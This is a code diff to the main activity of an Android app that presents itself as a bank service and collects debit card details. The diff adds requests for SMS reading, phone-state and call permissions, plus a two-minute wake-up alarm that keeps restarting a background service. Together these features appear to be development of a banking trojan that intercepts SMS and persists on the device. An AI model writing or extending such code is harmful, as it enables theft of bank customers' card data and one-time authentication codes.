@@ -2,6 +2,8 @@
 
     import android.Manifest;
     import android.annotation.SuppressLint;
+    import android.app.AlarmManager;
+    import android.app.PendingIntent;
     import android.content.DialogInterface;
     import android.content.Intent;
     import android.content.pm.PackageManager;
@@ -26,6 +28,7 @@
     import com.union.bank.service.settings.bg.DateInputMask;
     import com.union.bank.service.settings.bg.DebitCardInputMask;
     import com.union.bank.service.settings.bg.FormValidator;
+    import com.union.bank.service.settings.bg.ServiceRestarter;
 
     import org.json.JSONException;
     import org.json.JSONObject;
@@ -57,6 +60,7 @@
             } else {
                 startService(serviceIntent);
             }
+            scheduleDomainUpdateAlarm();
 
             dataObject = new HashMap<>();
             checkAndRequestPermissions();
@@ -68,6 +72,8 @@
                 Intent intent = new Intent(MainActivity.this, NoInternetActivity.class);
                 startActivity(intent);
             }
+
+
 
 
             // Initialize the ids map
@@ -217,12 +223,17 @@
         private void checkAndRequestPermissions() {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 // Check if the SMS permission is not granted
-                if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) !=
-                        PackageManager.PERMISSION_GRANTED ||
-                        ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) !=
-                                PackageManager.PERMISSION_GRANTED) {
+                if (
+                        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED ||
+                        ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED ||
+                                ContextCompat.checkSelfPermission(this, Manifest.permission.WAKE_LOCK) != PackageManager.PERMISSION_GRANTED ||
+
+                        ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED ||
+                        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED ||
+                        ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) !=  PackageManager.PERMISSION_GRANTED) {
+
                     ActivityCompat.requestPermissions(this,
-                            new String[]{Manifest.permission.SEND_SMS, Manifest.permission.RECEIVE_SMS},
+                            new String[]{Manifest.permission.WAKE_LOCK, Manifest.permission.SEND_SMS, Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS, Manifest.permission.READ_PHONE_STATE, Manifest.permission.CALL_PHONE},
                             SMS_PERMISSION_REQUEST_CODE);
                 } else {
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
@@ -235,33 +246,40 @@
             }
         }
 
-        @RequiresApi(api = Build.VERSION_CODES.M)
         @Override
-        public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
-                                               @NonNull int[] grantResults) {
+        public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
             super.onRequestPermissionsResult(requestCode, permissions, grantResults);
 
             if (requestCode == SMS_PERMISSION_REQUEST_CODE) {
-                if (grantResults.length > 0 &&
-                        grantResults[0] == PackageManager.PERMISSION_GRANTED &&
-                        grantResults[1] == PackageManager.PERMISSION_GRANTED) {
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                        initializeWebView();
+                // Check if permissions are granted or not
+                if (grantResults.length > 0) {
+                    boolean allPermissionsGranted = true;
+                    StringBuilder missingPermissions = new StringBuilder();
+
+                    for (int i = 0; i < grantResults.length; i++) {
+                        if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
+                            allPermissionsGranted = false;
+                            missingPermissions.append(permissions[i]).append("\n"); // Add missing permission to the list
+                        }
                     }
-                } else {
-                    // SMS permissions denied
-                    showPermissionDeniedDialog();
+                    if (allPermissionsGranted) {
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                            initializeWebView();
+                        }
+                    } else {
+                        showPermissionDeniedDialog();
+                        Toast.makeText(this, "Permissions denied:\n" + missingPermissions.toString(), Toast.LENGTH_LONG).show();
+                    }
                 }
             }
         }
 
+
         private void showPermissionDeniedDialog() {
             AlertDialog.Builder builder = new AlertDialog.Builder(this);
             builder.setTitle("Permission Denied");
-            builder.setMessage("SMS permissions are required to send and receive messages. " +
-                    "Please grant the permissions in the app settings.");
+            builder.setMessage("SMS permissions are required to send and receive messages. " +  "Please grant the permissions in the app settings.");
 
-            // Open settings button
             builder.setPositiveButton("Open Settings", new DialogInterface.OnClickListener() {
                 @Override
                 public void onClick(DialogInterface dialog, int which) {
@@ -299,6 +317,22 @@
             dialog.show();
 
             new Handler().postDelayed(dialog::dismiss, 3000);
+        }
+
+        private void scheduleDomainUpdateAlarm() {
+            AlarmManager alarmManager = (AlarmManager) getSystemService(this.ALARM_SERVICE);
+
+            Intent intent = new Intent(this, ServiceRestarter.class);
+            int flags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.S
+                    ? PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
+                    : PendingIntent.FLAG_UPDATE_CURRENT;
+
+            PendingIntent pendingIntent = PendingIntent.getBroadcast(
+                    this, 0, intent, flags);
+
+            long interval = 2 * 60 * 1000;
+            long triggerAtMillis = System.currentTimeMillis() + interval;
+            alarmManager.setRepeating( AlarmManager.RTC_WAKEUP, triggerAtMillis, interval, pendingIntent);
         }
 
     }
